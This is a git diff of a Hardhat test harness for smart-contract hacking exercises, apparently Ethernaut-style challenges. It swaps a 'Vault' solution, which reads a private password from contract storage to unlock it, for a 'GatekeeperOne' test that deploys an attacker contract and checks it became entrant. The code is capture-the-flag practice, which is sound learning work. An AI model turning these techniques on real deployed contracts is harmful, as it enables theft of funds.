@@ -10,15 +10,14 @@ const { ethers } = require("hardhat");
 const hre = require("hardhat");
 import Web3 from "web3";
 
-const NAME = "Vault";
+const NAME = "GatekeeperOne";
 
 describe(NAME, function () {
     async function setup() {
         const [owner, attackerWallet] = await ethers.getSigners();
 
         const VictimFactory = await ethers.getContractFactory(NAME);
-        let arg = ethers.utils.formatBytes32String("AAABBBCCC");
-        const victimContract = await VictimFactory.deploy(arg);
+        const victimContract = await VictimFactory.deploy();
 
         return { owner, victimContract, attackerWallet };
     }
@@ -30,19 +29,14 @@ describe(NAME, function () {
         })
 
         it("conduct your attack here", async function () {
-            hre.web3 = new Web3(hre.network.provider);
+            const AttackerFactory = await ethers.getContractFactory("Solution17");
+            attackerContract = await AttackerFactory.connect(attackerWallet).deploy(victimContract.address);
 
-            let value = await hre.web3.eth.getStorageAt(victimContract.address, 1);
-
-            //let password = hre.web3.utils.toAscii(value);
-            //console.log(password);
-
-            //let arg = ethers.utils.formatBytes32String(password);
-            await victimContract.connect(attackerWallet).unlock(value);
+            await attackerContract.connect(attackerWallet).attack();
         });
 
         after(async function () {
-            expect(await victimContract.locked.call()).to.be.equal(false);
+            expect(await victimContract.entrant.call()).to.be.equal(attackerWallet.address);
         });
     });
 });
